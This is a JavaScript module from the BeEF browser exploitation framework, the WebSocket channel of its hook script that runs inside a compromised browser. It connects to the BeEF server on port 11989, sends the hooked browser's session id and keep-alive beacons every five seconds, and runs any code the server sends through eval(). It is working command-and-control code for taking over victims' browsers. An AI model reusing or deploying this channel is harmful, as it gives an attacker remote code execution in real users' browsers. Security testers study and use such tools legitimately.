//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//

//beef.websocket.socket.send(take answer to server beef)
/*New browser init call this */

beef.websocket = {

    socket:null,

    alive_timer:5000,

    init:function () {
        var webSocketServer = beef.net.host;
        var webSocketPort = 11989;

        if (beef.browser.isFF() && !!window.MozWebSocket) {
            beef.websocket.socket = new MozWebSocket("ws://" + webSocketServer + ":" + webSocketPort + "/");

        } else {
            beef.websocket.socket = new WebSocket("ws://" + webSocketServer + ":" + webSocketPort + "/");

        }

    },
    /* send Helo message to the BeEF server and start async communication*/
    start:function () {
        new beef.websocket.init();
        this.socket.onopen = function () {
            //console.log("Socket has been opened!");

            /*send browser id*/
            beef.websocket.send('{"cookie":"' + beef.session.get_hook_session_id() + '"}');
            //console.log("Connected and Helo");
            beef.websocket.alive();
        }
        this.socket.onmessage = function (message) {
            //console.log("Received message via WS."+ message.data);
            eval(message.data);
        }

    },

    send:function (data) {
        this.socket.send(data);
//        console.log("Sent [" + data + "]");
    },

    alive: function (){
        beef.websocket.send('{"alive":"'+beef.session.get_hook_session_id()+'"}');
//        console.log("sent alive");
        setTimeout("beef.websocket.alive()", beef.websocket.alive_timer);

    }
};

beef.regCmp('beef.websocket');